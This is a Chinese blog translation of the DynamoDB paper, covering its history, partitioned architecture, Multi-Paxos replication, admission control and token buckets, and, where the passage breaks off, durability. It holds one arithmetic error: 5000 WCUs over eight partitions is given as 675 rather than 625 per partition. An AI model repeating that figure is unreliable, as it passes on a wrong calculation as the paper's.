<p><strong>DynamoDB支持灵活的用例。</strong>&nbsp;DynamoDB并不强制要求开发人员使用特定的数据模型或一致性模型。DynamoDB表（Table）没有固定的Schema，允许每个<code>数据条目（Data item）</code>包含任意数量、不同类型的<code>属性（Attribute）</code>，属性包括不同的<code>类型（Type）</code>。表使用键-值或文档数据模型。从表中读取条目时，开发人员可以要求<strong>强一致性</strong>或<strong>最终一致性</strong>。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>本文描述<strong>DynamoDB如何发展成一种分布式数据库服务，在多租户架构下为每个客户提供单租户体验。</strong>&nbsp;解释了系统面临的挑战，以及如何改进系统以应对这些挑战。这些改进关系到持久性、可用性、可伸缩性和可预测性能这些共同的主题。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>这篇论文总结了我们多年来学到的经验教训：</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>根据客户的流量模式来重塑数据库表的物理分区方案，可以提高客户体验。</li><li><strong>对静态数据持续进行校验</strong>是一种可靠的方法，可以防止硬件故障和软件Bug，实现高持久性。</li><li>随着系统的发展，维护高可用性需要<strong>严谨的操作规范和工具</strong>。复杂算法的形式证明、<a href="https://wa.aws.amazon.com/wellarchitected/2020-07-02T19-33-23/wat.concept.gameday.en.html">Game days</a>(模拟混乱和负载测试)、升级/降级测试和部署安全等机制使我们可以自由地对代码进行调整和实验，而不用担心会影响正确性。</li><li><strong>设计系统时更重视可预测性（predictability）而不是绝对效率（absolute efficiency）可以提高系统的稳定性。</strong>尽管缓存等组件可以提高性能，但不要允许它们隐藏在它们不存在的情况下将要执行的工作，以确保系统总是准备好处理意外情况。(While components such as caches can improve performance, do not allow them to hide the work that would be performed in their absence, ensuring that the system is always provisioned to handle the unexpected.)</li></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":1} -->
<h1 id="2-%E5%8E%86%E5%8F%B2">2 历史</h1>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>设计DynamoDB的动机来源于对其前身Dynamo[9]的体会，Dynamo是亚马逊开发的第一个NoSQL数据库系统。创建Dynamo是为了满足对购物车数据的高可伸缩、高可用和持久的Key-Value数据库的需求。<strong>早些年，Amazon了解到，应用程序直接访问传统企业数据库实例的会导致伸缩性瓶颈</strong>，比如连接管理、并发工作负载之间的干扰，以及模式升级等任务的操作问题。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>因此，采用<strong>面向服务的体系结构（service-oriented architecture）</strong>，提供服务层API来封装应用程序的数据可以充分解耦，以解决重新配置之类的问题，而不用中断客户端。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>高可用性</strong>是数据库服务的一个关键属性，因为任何停机都可能影响依赖这些数据的客户。Dynamo的另一个关键要求是<strong>可预测的性能</strong>，使应用程序能够为用户提供稳定的体验。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>为了实现这些目标，亚马逊在设计Dynamo时必须从第一原理出发。Dynamo广泛运用到亚马逊内部的多个使用场景，因为它是唯一一个提供大规模高可靠性的数据库服务。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>然而，Dynamo仍然具有自管理大型数据库系统（self-managed large database systems）的操作复杂性。</strong>&nbsp;Dynamo是一个单租户系统，团队自己负责Dynamo的安装和管理。团队成员必须了解数据库服务各个部分，由此带来的复杂操作成为使用障碍。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>那段时间，Amazon推出了新的服务(尤其是Amazon S3和Amazon SimpleDB)，它们专门提供<strong>无需管理</strong>和<strong>弹性</strong>的体验，以消除这种操作负担。虽然Dynamo通常更贴合应用程序的需求，但Amazon的工程师更喜欢使用这些不用自己管理的新服务。<strong>托管弹性服务将开发人员从数据库管理中解放出来，让他们能专注于自己的应用程序。</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Amazon提供的第一个<strong>数据库即服务（database-as-a-service, 简称DBaaS）</strong>&nbsp;是<strong>SimpleDB[1]</strong>，这是一个全托管的弹性NoSQL数据库服务。SimpleDB提供了<strong>多数据中心复制、高可用性和高持久性</strong>，不需要客户设置、配置或为其数据库打补丁。与Dynamo一样，SimpleDB提供非常<strong>简单的表接口（table interface）</strong>，包含有限的查询集合，可以作为开发人员的构件。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220829212516.png" alt="表1：DynamoDB中Item的CRUD APIs"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>虽然SimpleDB取得了成功，并支持许多应用程序，但是它有一些<strong>局限</strong>：</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>表的存储容量(10GB)和请求吞吐量都很小。</li><li>不可预测的查询和写入延迟。这是因为所有表属性上都建立了索引，并且每次写入都需要更新索引。</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>这些局限性为开发人员带来了一种新的操作负担。他们必须将数据划分到多个表以满足应用程序的存储和吞吐量需求。</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>我们意识到，通过SimpleDB的API不可能消除SimpleDB的局限性，提供具备可预测性能和可扩展能力的NoSQL数据库服务。<strong>我们得出的结论是，更好的解决方案应该将Dynamo最初设计的最佳部分(增量可伸缩性和可预测的高性能)与SimpleDB的最佳部分(云服务的易于管理、一致性和比纯KV存储更丰富的基于表的数据模型)结合起来。</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>这些关于架构的讨论在2012年推出Amazon DynamoDB这项公共服务时达到高峰。它的名字与之前的Dynamo大部分相同，但架构上几乎完全不同。Amazon DynamoDB是我们在为Amazon.com构建大规模非关系型数据库的过程中得到经验的结晶，它是基于我们在AWS构建高可伸缩和可靠云计算服务的经验发展来的。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":1} -->
<h1 id="3-%E6%9E%B6%E6%9E%84">3 架构</h1>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>DynamoDB&nbsp;<strong>表（table）</strong>&nbsp;是&nbsp;<strong>条目（item）</strong>&nbsp;的集合，每个条目是&nbsp;<strong>属性（attribute）</strong>&nbsp;的集合。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>每个条目都由一个&nbsp;<strong>主键（primary key）</strong>&nbsp;唯一标识。主键的&nbsp;<strong>模式（schema）</strong>&nbsp;在表创建时指定。主键模式有两种：</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>单纯的<strong>分区键（partition key）</strong></li><li><strong>分区键+排序键（sort key）</strong>&nbsp;组成复合主键。</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>分区键用作内部哈希函数的输入。哈希函数的输出和排序键(如果存在)决定条目将存储在哪里。具有复合主键的表中可能有多个分区键相同的条目，但是这些<strong>条目的排序键必须不同。</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>DynamoDB还支持<strong>辅助索引（secondary index）</strong>，以提供更强的查询功能。一个表可以有一个或多个辅助索引。使用辅助索引可以加速非主键属性上的查询。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>DynamoDB提供简单的接口来从表和索引中存取和检索条目。表1包含客户端用于读写DynamoDB表中的条目的主要操作。插入、更新或删除条目等操作都可以指定一个条件，且操作必须满足这个指定的条件。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>DynamoDB<strong>支持ACID事务</strong>，使应用程序能够在更新多个条目的同时确保条目之间的原子性、一致性、隔离性和持久性(ACID)，且不影响DynamoDB表的可伸缩性、可用性和性能特征。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>DynamoDB中表被划分为多个<strong>分区（partitions）</strong>，以解决表的吞吐量和存储需求。表的每个分区都是连续但不相交的部分，称为<strong>键范围（key range）</strong>&nbsp;。每个分区有多个副本，分布在不同的<strong>可用区（Availablity Zones）</strong>&nbsp;上，以实现高可用和持久性。分区的副本组成<strong>复制组（replication group）</strong>&nbsp;。<strong>复制组使用Multi-Paxos[14]进行leader选举和共识。</strong>&nbsp;任何副本都可以举行选举，被选为领导（leader）的副本（replica）只要定期更新领导租约（leadership lease），就可以保持领导权。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>只有领导副本可以响应写请求和强一致性的读请求。</strong>&nbsp;接收到写请求时，被写入key对应的复制组的leader会生成一条<strong>WAL（write ahead log）记录</strong>，并将它发送给其它副本节点。复制组中有足够数量的节点将日志记录到本地日志后，立刻向应用程序返回写入确认。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>DynamoDB支持<strong>强一致</strong>和<strong>最终一致</strong>的读取（Strongly and eventually consistent reads）。复制组中的任何副本都可以提供最终一致读。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>组leader通过<strong>租约机制</strong>延长领导权。<strong>如果组中任何一个成员发现leader出现故障(认为其不健康或不可用)，这个成员可以提议进行新一轮的选举</strong>，并选举自己成为新的leader。在前一个leader的租约到期之前，新leader不会执行任何写操作或一致的读操作。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220829212731.png" alt="图2：在存储节点中存储副本"/></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220829212817.png" alt="图3：日志节点中的日志副本"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>复制组由<strong>存储副本（storage replica）</strong>&nbsp;组成，其中包含<strong>预写日志（WAL）</strong>&nbsp;和存储键值数据的<strong>B-tree</strong>，如图2所示。为了提高可用性和持久性，复制组可以存在只包含最近的预写日志条目的副本，如图3所示。这些副本称为<strong>日志副本（log replicas）</strong>。日志副本类似于Paxos中的acceptors。日志副本不存储键值数据。第5节和第6节会阐述日志副本如何使DynamoDB提高可用性和持久性。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>（关于paxos算法，请参考：<a href="https://zh.wikipedia.org/wiki/Paxos%E7%AE%97%E6%B3%95">Paxos算法</a>）</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>DynamoDB由数十个微服务构成，其中部分<strong>核心服务包括元数据服务、请求路由服务、存储节点和自动管理服务</strong>，如图4所示。</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li><strong>元数据服务（metadata service）</strong>&nbsp;存储关于表、索引和键的复制组的路由信息。</li><li><strong>请求路由服务（request routing service）</strong>&nbsp;负责授权、身份验证并将每个请求路由到适当的服务器。例如，所有读取和更新请求都路由到承载客户数据的存储节点。请求路由器从元数据服务查找路由信息。</li><li>所有资源创建、更新和数据定义请求都路由到<strong>自动管理服务（autoadmin service）</strong>。</li><li><strong>存储服务（storage service）</strong>&nbsp;负责将客户数据存储在一个存储节点集群中。每个存储节点承载着许多不同分区的副本。</li></ul>
<!-- /wp:list -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220829212945.png" alt="图4：DynamoDB架构"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>自动管理服务是DynamoDB的中枢神经系统：</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>负责集群运行状况、分区运行状况、表的伸缩以及所有控制平面请求的执行。</li><li>持续监视所有分区的健康状况，并替换被认为不健康的副本(速度慢、响应不灵敏或托管在坏的硬件上)。</li><li>对所有核心组件进行健康状况检查，替换逐渐故障或已经故障的硬件。例如，如果自动管理服务检测到一个存储节点不健康，它会启动一个恢复进程来接管该节点上托管的副本，使系统恢复到稳定状态。</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>还有其它图4中没有展示的DynamoDB服务，诸如时间点恢复（PITR）、按需备份、更新流、全局准入控制、全局表、全局辅助索引和事务等特性。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":1} -->
<h1 id="4-%E4%BB%8E%E9%A2%84%E5%88%86%E9%85%8D%E5%88%B0%E6%8C%89%E9%9C%80%E4%BD%BF%E7%94%A8">4 从预分配到按需使用</h1>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>DynamoDB发布时，<strong>我们引入了一个内部抽象——分区，作为动态扩展表的容量和性能的方法。</strong>&nbsp;在最初的DynamoDB版本中，客户根据<strong>读容量单位(RCUs)</strong>&nbsp;和<strong>写容量单位(WCUs)</strong>&nbsp;显式地指定了表所需的吞吐量。</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>对于大小不超过4kb的数据条目，一个RCU每秒可以执行一个强一致性的读请求。</li><li>对于大小不超过1kb的条目，一个WCU可以每秒执行一个标准写请求。</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>RCUs和WCUs统称为<strong>分配吞吐量（provisioned throughtput）</strong>。<strong>原始系统将表划分为多个分区，将内容分布在多个存储节点上，并映射到这些节点的可用空间和性能上</strong>（The original system split a table into partitions that allow its contents to be spread across multiple storage nodes and mapped to both the available space and performance on those nodes.）。<strong>当一个表的需求发生变化时（因为大小增加或负载增加），可以进一步分割和迁移分区，以对表进行弹性伸缩。</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>分区抽象被证明是非常有价值的，并且被保留下来成为DynamoDB设计的核心。<strong>然而，早期版本将容量和性能的分配紧密耦合到各个分区，带来一些问题。</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>DynamoDB使用准入控制（admission control）来确保存储节点不会超载，避免同一个节点上的表分区之间产生干扰，保证客户所要求的吞吐量限制。</strong>&nbsp;在过去的十年中，DynamoDB中的准入控制在不断发展。准入控制是所有存储节点对表的共同责任。存储节点根据本地存储分区的分配独立地执行准入控制。假设一个存储节点承载来自多个表的分区，那么分配给每个分区的吞吐量将用于隔离工作负载。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>DynamoDB限制单个分区可分配的最大吞吐量，确保<strong>存储节点上托管的所有分区的吞吐量之和小于或等于该节点最大吞吐量</strong>，这是由其存储驱动器的物理特性决定的。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>当表的总吞吐量发生变化或分区被划分为子分区时，分配给分区的吞吐量会被调整。</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>当对一个分区进行大小划分时，父分区分配到的吞吐量被平均分配到子分区中。</li><li>当一个分区进行吞吐量划分时，根据表分配到的吞吐量为新分区分配吞吐量。</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>例如，假设一个分区可以容纳1000个WCUs的最大吞吐量：</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>创建一个3200 WCUs的表，DynamoDB创建四个分区，每个分区将分配800个WCUs。</li><li>如果表提供的吞吐量增加到3600 WCUs，那么每个分区的容量将增加到900 WCUs。</li><li>如果表提供的吞吐量增加到6000个WCUs，那么将划分分区以创建8个子分区，每个分区将分配750个WCUs。</li><li>如果表的容量减少到5000 WCUs，那么每个分区的容量将减少到675 WCUs。</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>之所以均匀地分配各个分区的吞吐量，是<strong>基于以下假设</strong>：</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>应用程序均匀地访问表中的key</li><li>根据大小划分分区等价于对性能进行划分（splitting a partition for size equally splits the performance）。</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>但是，我们发现在时间和key的范围两个维度上，应用程序工作负载的访问模式往往都是不统一的。<strong>如果一个表中的请求率不均匀，那么对分区进行分割并按比例划分性能，会导致分区的热部分（hot portion）的可用性能低于分割之前。</strong>&nbsp;由于吞吐量是静态分配的，并在分区级别强制执行，虽然此时表的总吞吐量是足以满足其需求的，但这些不均匀的工作负载时不时会导致应用程序的读写被拒绝，即所谓的<strong>限流（throttling）</strong>。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>应用程序最常见的两个挑战是:<strong>热分区（hot partition）</strong>&nbsp;和<strong>吞吐量稀释(throughput dilution)</strong>。</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>当应用程序的流量持续流向表中的某些条目时，就会产生热分区。热点条目可以属于一组稳定的分区，也可以随时间跳转到不同的分区。</li><li>对于按大小划分分区的表，吞吐量稀释是常见的。根据大小分割一个分区会导致分区的吞吐量在新创建的子分区之间平均分配，因此每个分区的吞吐量会下降。</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>从客户的角度来看，在这两种情况下，即使服务的行为符合预期，限流也会导致他们的应用程序在一段时间内不可用。想避免限流的客户可以通过增加表的分配吞吐量和预留冗余的容量来解决这个问题。换句话说就是给表分配过剩的资源。虽然这能使他们获得所需的性能，但体验并不好，因为很难估计应该给表分配多少性能。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="41-%E5%AF%B9%E5%87%86%E5%85%A5%E6%8E%A7%E5%88%B6%E7%9A%84%E5%88%9D%E6%AD%A5%E6%94%B9%E8%BF%9B">4.1 对准入控制的初步改进</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>正如本节前面所提到，热分区和吞吐量稀释源自于我们为每个分区绑定固定的性能分配，并在分区时分配性能。避免将分布式的准入控制复杂化，我们选择在单独的分区级别强制分配，但显然这些控制机制不能满足需求。在发布后不久，DynamoDB引入<strong>突发（bursting）</strong>&nbsp;和<strong>自适应容量（adaptive capacity）</strong>&nbsp;来解决这些问题。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 id="411-%E7%AA%81%E5%8F%91bursting">4.1.1 突发（Bursting）</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><strong>分区访问的不平均使我们注意到，存储节点上各个分区并不是同时使用分配到的吞吐量。</strong>&nbsp;为了在分区级别（partition level）吸收工作负载中的<strong>短时峰值（short-lived spikes）</strong>，DynamoDB引入了突发的概念。突发可以让应用程序在分区级别上尽可能利用未使用的容量以吸收短暂的峰值。<strong>DynamoDB在分区时保留一部分容量，供不超过300秒的突发吞吐量使用，在分区消耗的容量超过分配的容量时可以使用它。这部分未使用的容量称为突发容量（burst capacity）。</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>为了保证负载隔离，只有在节点级别（node level）存在在未使用的吞吐量时Dynamo才允许使用突发。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>存储节点使用令牌桶（token bucktet）管理容量：</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>每个分区2个令牌桶，<strong>分配桶</strong>和<strong>突发桶</strong></li><li>每个节点1个令牌桶</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>通过这些桶进行准入控制：</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>当一个读或写请求到达存储节点时，如果分区级别的分配桶中有令牌（token），接受该请求并<strong>从分区和节点的桶中扣除令牌。</strong></li><li>如果一个分区的分配桶令牌用完了，<strong>只有突发桶和节点令牌桶都有令牌剩余，才可以进行突发。</strong></li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>读请求只检查本地令牌桶，而<strong>使用突发容量的写请求需要额外检查该分区的其他成员副本的节点令牌桶。</strong>&nbsp;分区的leader副本定期收集每个成员节点级容量的信息。在4.3节会解释如何提高节点的突发能力。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 id="412-%E8%87%AA%E9%80%82%E5%BA%94%E5%AE%B9%E9%87%8Fadaptive-capacity">4.1.2 自适应容量（Adaptive Capacity）</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>DynamoDB使用<strong>自适应容量</strong>吸收突发容量无法处理的<strong>长时峰值（long-live spikes）</strong>。自适应容量使DynamoDB能更好地吸收跨多个分区的严重倾斜负载。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>自适应容量时常监控所有表的分配容量和消耗容量。<strong>如果一个表遇到限流，而且总吞吐量没有超过表级别分配给它的吞吐量，就会使用比例控制算法（proportional control algorithm）自动增加表分区分配的吞吐量。</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>如果表消耗的容量超过了分配给它的容量，被提升的分区容量就会被削减。<strong>自动管理系统（autoadmin system）将被提升分区迁移到一个适当的节点，该节点有能力服务增加的吞吐量</strong>。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>适应性容量与突发一样是<strong>尽力而为（best-effort）</strong>&nbsp;的机制，但可以消除99.99%以上由于倾斜访问模式产生的限流。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="42-%E5%85%A8%E5%B1%80%E5%87%86%E5%85%A5%E6%8E%A7%E5%88%B6global-admission-control">4.2 全局准入控制（Global Admission Control）</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>虽然DynamoDB使用突发和自适应容量极大地减少了非均匀访问导致的吞吐量问题，但这<strong>两种解决方案都有局限性</strong>。</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>突发只能处理短时峰值，依赖节点冗余的吞吐量实现突发。</li><li>适应性能力是被动的，只有在出现限流后才能发挥作用。换句话说使用该表的应用程序已经经历了短暂的不可用。</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>从突发容量和自适应容量总结出的重要经验是，我们使分区级容量与准入控制的耦合过于紧密，准入控制在分区级别分布执行。</strong>&nbsp;DynamoDB项目组意识到更好的做法是提供工作负载隔离的同时，解耦准入控制和分区让分区可以随时突发（DynamoDB realized it would going to be beneficial to remove admission control from the partition and let the partition burst&nbsp;<em>always</em>&nbsp;while providing workload isolation.）</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>为了解决准入控制的问题，DynamoDB用<strong>全局准入控制(GAC)</strong>&nbsp;代替自适应容量，GAC同样使用令牌桶的思想。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>GAC服务通过令牌跟踪表容量的总消耗。每个<strong>请求路由器（request router）</strong>&nbsp;维护一个本地令牌桶以执行准入控制，定期(几秒钟的间隔)与GAC通信以补充令牌。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>GAC根据客户端请求动态地维护一个<strong>临时状态</strong>。每个GAC服务器的停止和重新启动不会对服务整体造成影响。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>根据不同的配置，每个GAC服务器可以跟踪一个或多个令牌桶。所有GAC服务器都是一个独立哈希环（hash ring）的一部分。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>请求路由器在本地管理带时间限制的令牌。当来自应用程序的请求到达时，请求路由器扣除令牌。一段时间后，请求路由器会因为使用或过期而耗尽令牌。耗尽令牌时请求路由器向GAC请求更多令牌。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>GAC实例通过客户端提供的信息估算全局令牌消耗，并将下一个时间单元可用的令牌分配给客户端的整体令牌份额。因此能够保证那些只访问部分条目的不均匀负载可以在最大分区容量下执行。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>除了全局准入控制（GAC）外，分区级令牌桶也被保留下来作为最后防线。<strong>限制这些令牌桶的容量，以确保一个应用程序不会消耗存储节点上的全部或大部分资源。</strong></p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="43-%E5%AE%B9%E9%87%8F%E6%B6%88%E8%80%97%E5%9D%87%E8%A1%A1">4.3 容量消耗均衡</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>为了让分区能够<strong>常时突发（always blust）</strong>，要求DynamoDB更有效地管理突发容量。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>DynamoDB可以运行在各种各样硬件实例类型（instance type）上，这些实例类型的吞吐量和存储能力各不相同。最新一代存储节点可以承载数千个分区副本。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>驻留在单个存储节点上的分区可能完全不相关，且属于不同的表。要在存储节点上托管来自多个表的副本（每个表可能来自不同的客户并有不同的流量特征）需要定义一个分配机制，这个机制决定哪些副本可以在不违反可用性、可预测的性能、安全性和弹性等关键指标的前提下和平共处。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>对于固定分配吞吐量的表，托管（Colocation）是一个简单的问题。由于有静态分区，在分配模式下托管更容易管理，静态分区使分配方案简单合理。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>在分配表不使用突发和自适应容量的情况下，分配过程包括根据分配的容量找到能够容纳分区的存储节点。分区不允许使用的流量超过分配的容量，因此不会影响到节点上的其它分区。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>存储节点上的分区不会用尽实例上的总容量。</strong>&nbsp;为了应对负载变化而进行突发时，可能会超出存储节点的额定容量，这时候的租户托管问题变得更为复杂。因此，系统会在存储节点中装入一组额外的副本，使实际容量大于节点的额定容量。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>DynamoDB实现了一个可以根据吞吐量消耗和存储量来主动平衡跨节点分区的系统</strong>，以降低副本过于聚集带来的可用性风险。每个存储节点自主监视所有托管副本的总体吞吐量和数据大小。<strong>如果吞吐量超过节点最大容量的某个百分比阈值，就会向自动管理服务（autoadmin service）报告可以当前节点迁移的候选分区副本列表（list of candidate partition replicas）。</strong>&nbsp;自动管理会在同一个或另一个可用域（Availability Zone，即数据中心）中找到没有该分区副本的新存储节点。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="44-%E6%B6%88%E8%80%97%E5%88%92%E5%88%86">4.4 消耗划分</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>即使引入GAC和分区常时突发，如果表的流量在特定的条目集合上倾斜，表仍然会被限流。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>为了解决这个问题，<strong>DynamoDB会根据消耗的吞吐量自动扩展分区。</strong>&nbsp;一旦某个分区消耗的吞吐量超过某个阈值，就会对该分区进行分割。<strong>键范围中的分割点根据分区观察到的键分布（key distribution）来选择。</strong>&nbsp;即监控负载在键范围上的分布状态，将其作为应用程序访问模式的表达（proxy），比单纯在键范围的中点分割更有效。分区分割通常在以分钟为数量级的时间内完成。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>划分对某些工作负载无效，例如：</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>在单条目上频繁访问的分区</li><li>按顺序访问键范围的分区</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>DynamoDB能够检测到这类访问模式，不会分割这样的分区。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="45-%E6%8C%89%E9%9C%80%E5%88%86%E9%85%8D">4.5 按需分配</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>许多迁移到DynamoDB的应用程序以前运行在本地或自托管的数据库上。在这两种场景下，应用程序开发人员都必须分配服务器。DynamoDB提供一个简化的Serverless操作模型和一个用于分配的新模型——<strong>读写容量单位（read and write capacity units）</strong>。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>容量单位的概念对客户来说比较陌生，有人觉得要预测需要分配多少吞吐量比较困难。正如本节开头提到的，客户要么分配过剩，导致低利用率，要么供应不足，导致限流。为了改善高负荷的客户体验，我们推出了<strong>按需分配表（on-demand table）</strong>。按需分配表消除了我们的客户需要自行计算分配量的问题。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>DynamoDB通过收集读写信号，根据消耗的容量按需进行分配，能马上吸收该表先前峰值两倍的流量。如果一个应用程序需要超过上一个表峰值两倍以上的流量，DynamoDB会随着流量增加自动分配更多的容量，确保工作负载不会受到限流。</strong>&nbsp;按需扩展表通过划分分区消耗实现。分割决策算法是基于流量的。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>GAC使DynamoDB可以监视并保护系统，防止一个应用程序消耗完所有资源。按需分配表的分区可以被合理地存储，根据消耗的容量进行有效的平衡，从而不会遇到节点级别的限制。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":1} -->
<h1 id="5-%E6%8C%81%E4%B9%85%E6%80%A7%E5%92%8C%E6%AD%A3%E7%A1%AE%E6%80%A7">5 持久性和正确性</h1>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>数据在commit后不能丢失。实际运行中硬件故障、软件bug或硬件bug都可能导致数据丢失。DynamoDB的设计包括预防、检测和纠正任何潜在数据丢失的机制，具有高持久性。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 id="51-%E7%A1%AC%E4%BB%B6%E6%95%85%E9%9A%9C">5.1 硬件故障</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>与大多数数据库管理系统一样，预写日志（write ahead log）[15]对于DynamoDB的持久性和崩溃恢复至关重要。<strong>预写日志存储在一个分区的所有三个副本中。为了实现更高的持久性，预写日志定期归档到S3，S3是一个为持久性设计的对象存储。</strong>&nbsp;每个副本包含最近的预写日志，这些日志存档之后会被归档。未归档日志的大小通常为几百兆字节。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>在大型服务中，内存和磁盘等硬件故障很常见。当一个节点发生故障时，节点上承载的所有复制组只剩下两个副本。修复存储副本的过程可能需要几分钟，因为需要复制B-tree和预写日志。<strong>在检测到不健康的存储副本时，复制组的leader会增加一份日志副本，以确保不会对持久性造成影响。</strong>&nbsp;添加日志副本只需要几秒钟，因为系统只需要将最近的预写日志从健康副本复制到新副本，而不需要复制B-tree。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
